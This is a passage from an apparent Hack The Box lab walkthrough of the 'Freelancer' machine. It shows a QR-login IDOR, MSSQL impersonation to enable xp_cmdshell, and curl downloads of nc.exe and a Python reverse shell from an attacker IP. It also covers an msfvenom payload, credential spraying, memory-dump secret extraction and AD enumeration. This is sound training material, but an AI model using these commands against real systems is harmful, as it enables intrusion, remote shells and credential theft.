admin, John Halond tomHazard, Tom Hazard martin1234, Martin Rose crista.W, Crista Watterson Camellia19970, Camellia Renesa lisa.Ar, Lisa Arkhader SaraArkhader, Sara Arkhader maya001, Maya Ackasha ItachiUchiha, Itachi Uchiha Philippos, Philip Marcos Jonathon.R, Jonathon Roman JohntheCarter, John Carter Markos, Mark Rose There may be more users, but those are at least the users with ID&rsquo;s less than 100. But then that begs the question: where is jimbob? Where is dragoncorp?
FOOTHOLD Account Recovery The presence of an account recovery process is pretty conspicuous - I think it&rsquo;s worth investigating. Yes, on a normal website this would be a very normal feature, but on an HTB box having an actual, functional account recovery process is out-of-the-ordinary.
To guage how the account recovery form might be used, I&rsquo;ll first try resetting the password for jimbob using the known answers to all three security questions. It works as expected, causing a redirect to a page where we can input a new password:
/accounts/password_reset/MTAwMTM=/c857ea-eb09dd12f71a9f4c3a2de7c6068dfb54/
Breaking the reset token (1) Let&rsquo;s break down the URI and try to figure out how it&rsquo;s composed. The first part is easy - it&rsquo;s clearly base64 data:
echo -n &#39;MTAwMTM=&#39; | base64 -d # 10013 Ahh ok, I bet that&rsquo;s the user ID. A quick check to /accounts/profile/visit/10013/ confirms this suspicion:
I&rsquo;ll edit enumerate-users.py to check higher IDs more easily:
import sys # [...] if len(sys.argv) &lt; 3: print(f&#39;Usage: {sys.argv[0]} &lt;start_id&gt; &lt;end_id&gt;&#39;) sys.exit() start = int(sys.argv[1]) end = int(sys.argv[2]) if end &lt;= start: print(f&#39;Error: &lt;start_id&gt; must be less than &lt;end_id&gt;&#39;) sys.exit() # [...] if __name__ == &#34;__main__&#34;: print(f&#39;Submitting {end-start} User ID guesses to {TARGET[:-8]}&#39;) for i in range(start, end+1): # [...] Then, testing it at the 10000+ range, we can see all the test users that were created:
Those first three were someone else. I created only jimbob and dragoncorp.
Breaking the reset token (2) &#x1f6ab; While I found this part interesting, it didn&rsquo;t actually get me any closer to a solution. Feel free to skip ahead to the next section if you&rsquo;re short on time.
But what about the end of the URI from the redirect? It looks like maybe the eb09dd12f71a9f4c3a2de7c6068dfb54 might be an MD5 hash&hellip; so does that mean that the c857ea might be a salt? If this reset token is deterministic, then it&rsquo;s possible that the process is broken enough to simply skip the security questions &#x1f914;
Thankfully, this idea is verifiable:
For this token to be usable by me, it needs to be predictable. For it to be predictable, it needs to be based on static information about the account (not just a random number), plus or minus some time-variant part too.
I can remove the time-variant aspect of it by submitting two identical requests at (more or less) the same instant. Both requests are identical.
Then, if the reset tokens in the resulting Location headers are identical, we can conclude that the reset token is predictable, even if we don&rsquo;t know how to predict it &#x1f4a1;
First, I&rsquo;ll write a script to test if this idea is even feasible. I just need a script that submits two identical password reset requests at the same moment. It&rsquo;s not very good code, but this is what I came up with:
#!/bin/python3 import requests from bs4 import BeautifulSoup import threading import sys URL = &#39;http://freelancer.htb/accounts/recovery/&#39; HEADERS = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#39;} DATA = { &#39;username&#39;: &#39;jimbob&#39;, &#39;security_q1&#39;: &#39;Dragon&#39;, &#39;security_q2&#39;: &#39;Dragon&#39;, &#39;security_q3&#39;: &#39;How to tame your dragon&#39;, } def post_account_recovery(sess, csrf_tok): data = DATA data[&#39;csrfmiddlewaretoken&#39;] = csrf_tok resp = sess.post(URL, data=data, headers=HEADERS, allow_redirects=False) # print the response headers: print(f&#39;{dict_pretty(resp.headers)}\\n&#39;) def dict_pretty(my_dict): return &#39;\\n&#39;.join(f&#34;{key}: {value}&#34; for key, value in my_dict.items()) s1 = requests.session() s2 = requests.session() # Have each session gain a CSRF token from the cookie resp1 = s1.get(URL, headers=HEADERS) resp2 = s2.get(URL, headers=HEADERS) if resp1.status_code != 200 or resp2.status_code != 200: print(f&#39;Initial GET request failed&#39;) sys.exit() # Obtain each CSRF middleware token soup1 = BeautifulSoup(resp1.text, &#39;html.parser&#39;) soup2 = BeautifulSoup(resp2.text, &#39;html.parser&#39;) csrf1 = soup1.find(&#39;input&#39;, {&#39;name&#39;: &#39;csrfmiddlewaretoken&#39;}).get(&#39;value&#39;, None) csrf2 = soup2.find(&#39;input&#39;, {&#39;name&#39;: &#39;csrfmiddlewaretoken&#39;}).get(&#39;value&#39;, None) if not csrf1 or not csrf2: print(f&#39;CSRF token was not detected from the form&#39;) sys.exit() print(f&#39;Detected CSRF tokens:\\n{csrf1}\\n{csrf2}\\n&#39;) # everything is prepared, now submit both requests &#34;at the same instant&#34; t1 = threading.Thread(target=post_account_recovery, args=(s1, csrf1)) t2 = threading.Thread(target=post_account_recovery, args=(s2, csrf2)) t1.start() t2.start() t1.join() t2.join() The result was this:
Since the same redirect was given to both sessions simultaneously submitting the account recovery form, we know that the reset token is indeed deterministic. But what is the format? It must be some composition of:
a timestamp the user account data. Observing the output of the script over time provided some really useful insight:
watch -d python3 security_questions.py I&rsquo;ll refer to the parts of the hash as [prefix][------suffix--------], where [prefix] is 6 characters, and [suffix] is 32 characters.
We can see very clearly from successive runs of the script that the [prefix] part of the hash is a counter that increments with each second. As far as I can tell, it&rsquo;s being expressed as some kind of base-36 number [0-9a-z] in at least the last two digits, and possibly only hex in the first 4 digits..?
we also know that a follows 9 in this scheme. I.e. b0 is one greater than az.
To try to crack this code, I&rsquo;ll check one example and see if I can get it to make sense:
Date: Wed, 05 Jun 2024 15:45:45 GMT Location: /accounts/password_reset/MTAwMTM=/c85co9-ef0882bb502f4d14b0a5e65be8dde60e/ That date has a unix epoch timestamp of 1717602345. First, I tried successive division of that unix timestamp by 36, to see how many digits would have to be base-36 and how many would have to be base-16 for it to be expressable in 6 characters:
The short answer is 6: All six characters need to be in base-36 for a number of that length to represent a whole unix timestamp.
To mess around with this idea, I wrote some more python. I&rsquo;ll convert the timestamp shown above into base-36 and see what I get. Then I&rsquo;ll convert the [prefix] shown above (c85co9) into base 10 and see what I get. Finally, I&rsquo;ll check the difference:
import sys alphabet = &#34;0123456789abcdefghijklmnopqrstuvwxyz&#34; def decimal_to_base36(decimal_number): if decimal_number == 0: return &#34;0&#34; base36 = &#34;&#34; while decimal_number: decimal_number, remainder = divmod(decimal_number, 36) base36 = alphabet[remainder] + base36 return base36 def base36_to_decimal(base36_number): decimal_number = 0 base = 1 for char in reversed(base36_number): decimal_number += alphabet.index(char) * base base *= 36 return decimal_number decimal_number = 1717602345 base36_number = decimal_to_base36(decimal_number) print(&#34;Base-36 representation of&#34;, decimal_number, &#34;is&#34;, base36_number) base36_number = &#39;c85co9&#39; decimal_number = base36_to_decimal(base36_number) print(&#34;Decimal representation of&#34;, base36_number, &#34;is&#34;, decimal_number) print(f&#39;The difference is: {1717602345 - decimal_number}&#39;) The difference is what would be needed to make the [prefix] line up perfectly with the timestamp. The result is surprising:
Huh, crazy. I&rsquo;m in GMT+2, so assuming I misinterpreted the timezone difference twice, then that puts the date exactly at January 1, 2001. In other words, the [prefix] might represent something like a unix epoch, except based on 2001 instead of 1970&hellip;
Freelancer Dashboard We still haven&rsquo;t finished exploring the functionality of the site. I&rsquo;ll try logging in as jimbob and see what the freelancer dashboard looks like.
After logging in and clicking on the Profile tab, we can see a variety of options available to the freelancer. Aside from a whole bunch of values being reflected to the page, nothing really stands out.
There is also a place to upload a profile picture, but since we&rsquo;re using Nginx + Django + Python, I don&rsquo;t expect that there is a file upload RCE here.
Any of the fields under My Profile or Change Sec-Questions might lead to SQLi or SSRF, so I&rsquo;ll be sure to test those later &#x1f6a9;
Employer Dashboard Doubtful it will work, but I&rsquo;ll try logging in as dragoncorp to see if I have access to the Employer dashboard, too.
Much to my surprise, it worked fine. The employer dashboard has several options available that weren&rsquo;t present in the freelancer dashboard:
The Post a New Job page is yet another place where we can enter data that is later reflected back to us (and to other users), so this is another spot that I&rsquo;ll need to test for SQLi, SSTI, and (less likely) stored XSS.
&#x261d;&#xfe0f; I&rsquo;m saying it&rsquo;s less likely that stored XSS is an option because this is posting employer-provided content.
The accounts we want access to are listed as employers - it&rsquo;s less likely that employers would be reading each other&rsquo;s job postings than freelancers reading job postings.
I created a Job posting to try the form out:
Now that I&rsquo;ve created a Job, I see that the Manage Jobs tab is simply a filtered view of the job search view, showing only jobs I&rsquo;ve posted.
While the features I&rsquo;ve already checked seem pretty normal, the QR-Code feature really stands out. Why is that there? It shows a QR code, apparently used for login:
Use your mobile phone to scan this QR-Code to login to your account without using any type of credentials. Please note that this QR-Code is valid for 5 Minutes only.&quot;
Wait, &ldquo;Without using any type of credentials&rdquo;? &#x1f440; This is definitely something to check out!
QR Code To investigate this, I&rsquo;ll use the same tool that I used while doing IClean: https://qreader.online/
I liked this particular QR code reader because they don&rsquo;t require any cookies or anything. Feel free to tip the developer if you like it too
Saving the QR code locally, then loading it into that online tool, I see that the QR contains a link in a very recognizable format: http://freelancer.htb/accounts/login/otp/MTAwMTQ=/aebd7815c09f1d725ec6cec0e5228399/
The MTAwMTQ= part is pretty obvious, but just to demonstrated, let&rsquo;s decode it:
echo -n &#39;MTAwMTQ=&#39; | base64 -d # 10014 I.e. it encodes the user ID of dragoncorp
Let&rsquo;s try the easiest thing, and test if we can exchange that user ID for another one. This is testing whether or not the hash at the end, b04e8fee07d9964b3eac3405bd5b369e, is linked to the user or not. If the authentication scheme is horribly broken, no such linkage exists and we can freely change users.
The most interesting one is clearly user 2. I&rsquo;ll try it with and without leading zeroes:
echo -n &#39;2&#39; | base64 # Mg== echo -n &#39;00002&#39; | base64 # MDAwMDI= As a first attempt, I changed this link: http://freelancer.htb/accounts/login/otp/MTAwMTQ=/aebd7815c09f1d725ec6cec0e5228399/ to this link: http://freelancer.htb/accounts/login/otp/Mg==/aebd7815c09f1d725ec6cec0e5228399/
Navigating to that link was clearly successful:
However, I don&rsquo;t see anything that admin has access to that dragoncorp didn&rsquo;t&hellip; It&rsquo;s possible that there are no additional priviliges I gained. So what was the point of gaining access to admin?
At this point, I asked myself &ldquo;what do I have/know now as admin, that I didn&rsquo;t already have/know as dragoncorp?&rdquo;
Well, all I&rsquo;ve really gained are new cookies; I have a different session.
But check out those cookies, their scope is the whole freelancer.htb domain - I should try using this new session at the /admin page I found earlier! &#x1f4a1;
Using the admin session, I navigated to the /admin page I found earlier, completely bypassing the login page that had stopped me before:
Admin dashboard I&rsquo;ve definitely gained access to a lot of new privileges by changing to the /admin directory. Under Custom users we can freely modify any user properties. I took the opportunity to set jimbob as a fully-privileged user, in case I lose this admin session:
All of those Comment object entries in the righthand sidebar (shown in the image from the previous section) are just comments on the various blog entries - probably unimportant.
Aside from that, the thing that catches my eye is the SQL Terminal listed under Development tools. Depending on how we can use it, we might be able to read files; if we&rsquo;re really lucky, this might even turn into RCE.
SQL Terminal It seems like this terminal should be a simple SQL command shell:
I can tell by reading the DOM that the darker grey line below the text entry is supposed to be the console output, but even trying the simplest of commands does not seem to work&hellip;
Enumeration Thinking that it might be something about user permissions, I tried switching to the (now fully-privileged) jimbob session. I was able to log in using a password at /admin, and found that the SQL Terminal widget looked a little different from the jimbob session, but more importantly it would execute commands:
Excellent! Now that I know the type of database, I&rsquo;ll manually enumerate it. I&rsquo;ll be loosely following the Manual Enumeration section of the Hacktricks page on MSSQL.
SELECT user; SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES Maybe there are some system tables too?
SELECT name FROM sys.databases; Can I read files? (MS SQL Server 2019 doesn&rsquo;t have anything like LOAD_FILE)
CREATE TABLE FileData ( Line NVARCHAR(MAX) ); BULK INSERT FileData FROM &#39;C:\\boot.ini&#39; WITH ( ROWTERMINATOR = &#39;\\n&#39;, FIELDTERMINATOR = &#39;\\t&#39; ); DROP TABLE FileData; Gaining RCE Can I access the xp_cmdshell?
EXEC xp_cmdshell &#39;whoami&#39;; Fine then. What perms do I have?
SELECT dp.name AS PrincipalName, dp.type_desc AS PrincipalType, perm.permission_name AS PermissionName, perm.state_desc AS PermissionState FROM sys.database_principals AS dp JOIN sys.database_permissions AS perm ON dp.principal_id = perm.grantee_principal_id WHERE dp.name = &#39;Freelancer_webapp_user&#39; ORDER BY PrincipalName, PermissionName; There are plenty of permissions to do arbitarary operations to the data, but nothing useful for RCE in there. What other users exist?
SELECT sp.name AS login, sp.type_desc AS login_type, sl.password_hash, sp.create_date, sp.modify_date, CASE WHEN sp.is_disabled = 1 THEN &#39;Disabled&#39; ELSE &#39;Enabled&#39; END AS status FROM sys.server_principals sp LEFT JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id WHERE sp.type NOT IN (&#39;G&#39;, &#39;R&#39;) ORDER BY sp.name; Hmm&hellip; can I impersonate sa?
EXECUTE AS LOGIN = &#39;sa&#39; SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;); That&rsquo;s good news - can I use sa to execute any commands?
EXECUTE AS LOGIN = &#39;sa&#39; EXEC xp_cmdshell &#34;whoami&#34;; Ok, so sa probably has permissions to use xp_cmdshell - it&rsquo;s just turned off. Can I turn it on?
EXECUTE AS LOGIN = &#39;sa&#39;; EXEC sp_configure &#39;show advanced options&#39;, &#39;1&#39;; RECONFIGURE; EXEC sp_configure &#39;xp_cmdshell&#39;, &#39;1&#39;; RECONFIGURE; That&rsquo;s true; it wasn&rsquo;t a query. But did it work?
EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#34;whoami&#34;; &#x1f924; YES! It did work.
&#x261d;&#xfe0f; It seems that xp_cmdshell is intermittently disabled. Every couple minutes, I need to re-enable xp_cmdshell using the exact same procedure as above.
It doesn&rsquo;t seem to work when I write a xp_cmdshell command prefixed by the SQL commands to enable it, so I&rsquo;ve had to alternate between enabling xp_cmdshell then issuing commands through it.
Popping a shell Let&rsquo;s get some basic info on the system by executing systeminfo:
Host Name: DC OS Name: Microsoft Windows Server 2019 Standard OS Version: 10.0.17763 N/A Build 17763 OS Manufacturer: Microsoft Corporation OS Configuration: Primary Domain Controller ... System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\WINDOWS System Directory: C:\\WINDOWS\\system32 ... [01]: vmxnet3 Ethernet Adapter Connection Name: Ethernet0 DHCP Enabled: No IP address(es) [01]: 10.10.11.5 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. I checked for a few useful tools, such as nc, wget, curl, and socat. Only curl seems to be present. Let&rsquo;s see if I can get it to contact a webserver on my attacker machine.
I&rsquo;ll also prepare a few files that might be useful later, like a variety of reverse shells. The python reverse shell I&rsquo;m using is the Python3 + Cmd reverse shell from revshells.com.
&#x1f447; I&rsquo;m using my own tool, simple-http-server. It&rsquo;s just a slight improvement on Python http.server, a lot like a PHP server, but with a few advantages for file upload and data exfiltration using base64.
# Open up the firewall sudo ufw allow from $RADDR to any port 8000,4444,4445 proto tcp # Prepare some files to serve mkdir -p www; cd www cp ~/Tools/WINDOWS/windows-binaries/nc.exe . cp ~/Tools/WINDOWS/socatx64.exe socat.exe cp ~/Tools/WINDOWS/RunasCs.exe . msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -a x64 -f exe -o reverse_shell.exe # Run the http server simple-server 8000 -v And in another tab:
bash rlwrap nc -lvnp 4444 Now I&rsquo;ll get the target to contact my http server:
EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#34;curl http://10.10.14.7:8000/?msg=hello&#34;; EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#34;curl -o C:\\Windows\\Temp\\nc.exe http://10.10.14.7:8000/nc.exe&#34;; -- EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#34;C:\\Windows\\Temp\\nc.exe 10.10.14.7 4444 -e cmd.exe&#34;; Maybe I don&rsquo;t have permissions to run files from Temp? I&rsquo;ll check if there&rsquo;s a home directory, and use that instead:
EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#34;dir C:\\Users&#34;; -- EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#34;curl -o C:\\Users\\sql_svc\\Downloads\\nc.exe http://10.10.14.7:8000/nc.exe&#34;; -- EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#34;C:\\Users\\sql_svc\\Downloads\\nc.exe 10.10.14.7 4444 -e cmd.exe&#34;; No, it&rsquo;s still having trouble. In fact, it seems like the system is deleting my copy of nc.exe moments after I download it. I&rsquo;m beginning to suspect I&rsquo;m fighting against an AV now.
Let&rsquo;s see if python is feasible instead:
EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#34;python --version&#34;; Great. Let&rsquo;s try the python reverse shell instead then.
EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#34;curl -o C:\\Users\\sql_svc\\Downloads\\revshell.py http://10.10.14.7:8000/revshell.py&#34;; -- EXECUTE AS LOGIN = &#39;sa&#39;; EXEC xp_cmdshell &#34;python C:\\Users\\sql_svc\\Downloads\\revshell.py&#34;; &#x1f44f; Alright! Finally got a reverse shell!
USER FLAG Local enumeration - sql_svc I&rsquo;ll take a look through the target manually, before I try any privesc scripts or anything.
&#x1f602; When I see stuff like this, it becomes obvious I&rsquo;m not alone in this box:
Since I can&rsquo;t access that apps directory, I&rsquo;ll check C:\\Users\\sql_svc:
That SQLEXPR-2019_x64_ENU directory seems odd. Checking inside there, I found a very helpful file, sql-Configuration.INI:
[OPTIONS] ACTION=&#34;Install&#34; QUIET=&#34;True&#34; FEATURES=SQL INSTANCENAME=&#34;SQLEXPRESS&#34; INSTANCEID=&#34;SQLEXPRESS&#34; RSSVCACCOUNT=&#34;NT Service\\ReportServer$SQLEXPRESS&#34; AGTSVCACCOUNT=&#34;NT AUTHORITY\\NETWORK SERVICE&#34; AGTSVCSTARTUPTYPE=&#34;Manual&#34; COMMFABRICPORT=&#34;0&#34; COMMFABRICNETWORKLEVEL=&#34;&#34;0&#34; COMMFABRICENCRYPTION=&#34;0&#34; MATRIXCMBRICKCOMMPORT=&#34;0&#34; SQLSVCSTARTUPTYPE=&#34;Automatic&#34; FILESTREAMLEVEL=&#34;0&#34; ENABLERANU=&#34;False&#34; SQLCOLLATION=&#34;SQL_Latin1_General_CP1_CI_AS&#34; SQLSVCACCOUNT=&#34;FREELANCER\\sql_svc&#34; SQLSVCPASSWORD=&#34;IL0v3ErenY3ager&#34; SQLSYSADMINACCOUNTS=&#34;FREELANCER\\Administrator&#34; SECURITYMODE=&#34;SQL&#34; SAPWD=&#34;t3mp0r@ryS@PWD&#34; ADDCURRENTUSERASSQLADMIN=&#34;False&#34; TCPENABLED=&#34;1&#34; NPENABLED=&#34;1&#34; BROWSERSVCSTARTUPTYPE=&#34;Automatic&#34; IAcceptSQLServerLicenseTerms=True &#x1f601; There&rsquo;s some creds. sql_svc : IL0v3ErenY3ager. Since this is a service account, I&rsquo;m hopeful for credential re-use. There&rsquo;s also a password for the sa user, t3mp0r@ryS@PWD, but I doubt that one is actually useful.
Let&rsquo;s get a list of the users on the box, so I can check credential reuse:
I&rsquo;ll put these into a file, users.txt. I&rsquo;ll also put the two passwords into passwords.txt. Thankfully, crackmapexec has a way to loop through all combinations easily.
crackmapexec winrm -u users.txt -p passwords.txt -x &#34;cmd /c whoami&#34; $RADDR However, the box also has SMB. I&rsquo;ll try the same thing there:
crackmapexec smb -u users.txt -p passwords.txt --continue-on-success -x &#34;cmd /c whoami&#34; $RADDR There we go - credential reuse confirmed. mikasaAckerman : IL0v3ErenY3ager
&#x1f602; ​Haha I&rsquo;m just realizing this now&hellip; these are characters from Attack on Titan!
SMB &#x1f6ab; This part did not lead towards a solution. Please skip ahead to the next section if you&rsquo;re short on time. Below, I take a look through the SMB SYSVOL share using the credentials I just found.
I tried to use these credentials for RCE as mikasaAckerman, but didn&rsquo;t have any luck. I tried things like smbmap, crackmapexec, etc. Oh well. Since we know these creds work for SMB, why not take a look around in there?
smbmap is useful for this, as it checks all the shares at once:
smbmap -H $RADDR -u mikasaAckerman -p &#39;IL0v3ErenY3ager&#39; IPC$ and NETLOGON are empty, but SYSVOL has some contents
smbclient --user=&#39;mikasaAckerman&#39; --password=&#39;IL0v3ErenY3ager&#39; //$RADDR/SYSVOL Inside, there is some kind of wacky DFSR directory:
What is DFSR, you ask? Yeah&hellip; I didn&rsquo;t know either:
&ldquo;Distributed File System Replication (DFSR) service in Windows. DFSR is a replication service that allows for the efficient replication of files across multiple servers and locations. It is commonly used in environments where data needs to be synchronized across different servers, such as in branch offices or disaster recovery scenarios&rdquo;
The only notable file is \\freelancer.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf. It lists out a whole bunch of SIDs. Otherwise, it seems unimportant &#x1f937;&zwj;&#x2642;&#xfe0f;
Pivot locally While I&rsquo;ve tried using the credentials I found for remote connection (over WinRM and SMB), I haven&rsquo;t yet tried using them to pivot to another user locally. The best tool for this job is RunasCs.exe; I&rsquo;ve already included it in the HTTP server I&rsquo;m running on my attacker machine.
If you don&rsquo;t have it already, you can obtain RunasCs.exe from the github repo. Just unzip it and you&rsquo;re good to go.
cd C:\\Users\\sql_svc\\AppData\\Local\\Temp curl -o RunasCs.exe http://10.10.14.7:8000/RunasCs.exe I&rsquo;ve also made a copy of my previous python reverse shell, but hardcoded it for port 4445. Since I&rsquo;ll need to execute that reverse shell as mikasaAckerman, I&rsquo;ll need to put it somewhere that I can write to as sql_svc but read from as mikasaAckerman. A good option is the Public folder:
cd C:\\Users\\Public\\Downloads curl -o revshell-4445.py http://10.10.14.7:8000/revshell-4445.py C:\\Users\\sql_svc\\AppData\\Local\\Temp\\RunasCs.exe &#34;mikasaAckerman&#34; &#34;IL0v3ErenY3ager&#34; &#34;python C:\\Users\\Public\\Downloads\\revshell-4445.py&#34; -t 0 &#x261d;&#xfe0f; the -t 0 option is used for running the command in the background. This is important if you want to open a new reverse shell without killing your old one.
Also note that I had to use an absolute filepath for the python script. I&rsquo;m not sure why.
Leaving our old reverse shell intact, we now have a new one!
Thankfully, mikasaackerman holds the user flag &#x1f917;
Just type it out for some well-earned points:
type user.txt ROOT FLAG Local enumeration - mikasaackerman Besides the user flag, there are two interesting files on Mikasa&rsquo;s desktop. I&rsquo;ll use the file upload feature of my simple-http-server to exfil these two files.
&#x1f605; Easier said than done! That MEMORY.7z file is huge! Why do they keep doing this to us? I find it punitive for folks like me who have to make-do with a really bad connection all the time.
(Another option would be SMB, which I might investigate if this fails.)
In the meantime, I should clean up what I&rsquo;ve left behind (as sql_svc):
del C:\\Users\\Public\\Downloads\\revshell-4445.py del C:\\Users\\sql_svc\\AppData\\Local\\Temp\\RunasCs.exe The mail.txt file shows a message explaining the contents of MEMORY.7z:
&ldquo;Hello Mikasa, I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the &ldquo;DATACENTER-2019&rdquo; computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019. I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server&rsquo;s CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart. Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue. Best regards&rdquo;
Alright then, let&rsquo;s extract this memory dump:
7z e MEMORY.7z This unpacks the 7z archive into a 1.7GB file. Checking file, we see that it is a MS Windows 64bit crash dump, version 15.17763, 2 processors, full dump.
There&rsquo;s a tool called memprocfs that is used for opening this type of file. It claims to be compatable with linux, and allows us to mount the .DMP file as a virtual filesystem. I&rsquo;ll follow the instructions from their repo:
mkdir tools/memprocfs; cd tools/memprocfs sudo apt-get install make gcc pkg-config libusb-1.0 libusb-1.0-0-dev libfuse2 libfuse-dev lz4 liblz4-dev mkdir build; cd build git clone https://github.com/ufrisk/LeechCore git clone https://github.com/ufrisk/MemProcFS cd LeechCore/leechcore make cd ../../MemProcFS/vmm make cd ../memprocfs make cd ../files ~/build/MemProcFS/files$ ./memprocfs -device &lt;your_dumpfile_or_device&gt; -mount &lt;your_full_mount_point&gt; Then, following their instructions, I downloaded the latest &ldquo;binary and files&rdquo; file from the releases page, and extracted the info.db file from inside, placing it at tools/memprocfs/build/MemProcFS/files/info.db.
Now I&rsquo;ll create a mount point and attempt to run MemProcFS:
mkdir -p loot/mikasa/MEMORY_mount ./memprocfs -device ~/Box_Notes/Freelancer/loot/mikasa/MEMORY.DMP -mount ~/Box_Notes/Freelancer/loot/mikasa/MEMORY_mount MemProcFS automatically attempts to extract the registry hives into files for us. This is akin to what the following would do on a live system:
reg save HKLM\\sam sam reg save HKLM\\system system reg save HKLM\\security security We can find these files in registry/hive_files:
Hopefully, I&rsquo;ll be able to use these with tools like pypykatz or impacket-secretsdump. I&rsquo;ll try pypykatz first:
SAM=0xffffd3067d935000-SAM-MACHINE_SAM.reghive SECURITY=0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive SYSTEM=0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive pypykatz registry -o ~/Box_Notes/Freelancer/loot/DMP_secrets.txt --sam $SAM --security $SECURITY $SYSTEM pypykatz registry --json -o ~/Box_Notes/Freelancer/loot/DMP_secrets.json --sam $SAM --security $SECURITY $SYSTEM This seems to have worked. Here&rsquo;s what the json file looks like:
A little further down, there are a couple entries that look like they might be plaintext passwords:
I&rsquo;ll append them to the passwords.txt file I have going, and try my luck again with WinRM:
crackmapexec winrm -u users.txt -p passwords.txt --continue-on-success -x &#34;cmd /c whoami&#34; $RADDR &#x1f389; Awesome! One of those passwords worked. We now have a confirmed WinRM credential lorra199 : PWN3D#l0rr@Armessa199
That means I should be able to log into the box using WinRM directly, instead of relying on a reverse shell. Let&rsquo;s try it out:
evil-winrm -i $RADDR -u &#39;lorra199&#39; -p &#39;PWN3D#l0rr@Armessa199&#39; There are some interesting privileges on Lorra199:
However, SeChangeNotify and SeIncreaseWorkingSet should be on every user, so they&rsquo;re unimportant, and this reference says that SeMachineAccount is not useful for privesc, so I&rsquo;ll keep looking.
Bloodhound Since this is a Windows AD environment, it would be wise to run Bloodhound to make some sense of all the permissions - and hopefully to find a way forward.
To do this, we need the DC name - use dig:
Since Bloodhound requires it, I added dc.freelancer.htb to my /etc/hosts file:
echo &#34;$RADDR dc.$DOMAIN&#34; | sudo tee -a /etc/hosts Configuring Neo4J for Bloodhound If this is your first time running Bloodhound, you&rsquo;ll need to establish Neo4j credentials. This is (maybe the dumb) way to do a password reset for it:
vim /usr/share/neo4j/conf/neo4j.conf # Disable authentication sudo neo4j start sudo neo4j stop vim /usr/share/neo4j/conf/neo4j.conf # Re-enable authentication sudo neo4j start The Neo4J console output should print an address where you can access it. Navigate to the http://localhost:7474/browser page and log in:
protocol: bolt:// username: neo4j password: neoj4 You&rsquo;ll be prompted immediately to change your password, go ahead and do that.
Next, we need to get the &ldquo;graph data science&rdquo; plugin:
sudo mkdir /usr/share/neo4j/plugins sudo curl -o /usr/share/neo4j/plugins/neo4j-graph-data-science-2.4.5.jar https://github.com/neo4j/graph-data-science/releases/download/2.4.5/neo4j-graph-data-science-2.4.5.jar # Now add the gds plugin to the &#34;unrestricted&#34; and &#34;allowlist&#34; sets: vim /usr/share/neo4j/conf/neo4j.conf Now we&rsquo;re ready to run Bloodhound. Use bloodhound-python to perform all the data collection as lorra199:
bloodhound-python -ns $RADDR -d &#39;freelancer.htb&#39; -dc &#39;dc.freelancer.htb&#39; -u &#39;lorra199&#39; -p &#39;PWN3D#l0rr@Armessa199&#39; -c All -v Then run the bloodhound UI, and refresh/re-import the data if necessary:
bloodhound I ran a query to show all users, and marked both mikasaAckerman and Lorra199 as owned.
Query all the users You can use the Raw Query widget at the bottom of the screen to submit a query manually. This is how you can check for all users stored in the database:
MATCH (n:User) RETURN n LIMIT 50 To add this as a saved query, open the sidebar and choose the Analysis tab. The last category is Custom Queries - click the pencil to edit your queries:
Then just add the query written in cypher, as shown above. Also assign it to a category, if you want.
Then used the Analysis query &ldquo;Shortest paths to Domain Admins from Owned Principals&rdquo;
However, I don&rsquo;t think this path actually helps. After all, if I could have a privileged powershell session on dc.freelancer.htb, then getting to administrator would be trivial. I don&rsquo;t have privileged credentials, so I this pathway is a bit of a non-starter.
AD Recycle Bin What else makes Lorra199 special? Well, we can see that Lorra199 is the only member of a really odd group:
Since Lorra199 is the only member of AD Recycle Bin, I&rsquo;ll go ahead and mark that group as an &ldquo;Owned Principal&rdquo; as well.
According to Bloodhound, &ldquo;Members of this group can list/delete/control the deleted active directory objects&rdquo;. Thankfully, Hacktricks also has a blurb about it. Let&rsquo;s try checking the deleted objects; presumably, members of AD Recycle Bin can recover these objects:
Get-ADObject -filter &#39;isDeleted -eq $true&#39; -includeDeletedObjects -Properties * This yields a LOT of information about deleted objects. It lists out several deleted users, including what groups they belonged to, some permissions, and a whole bunch of metadata. Here&rsquo;s a sample of one entry:
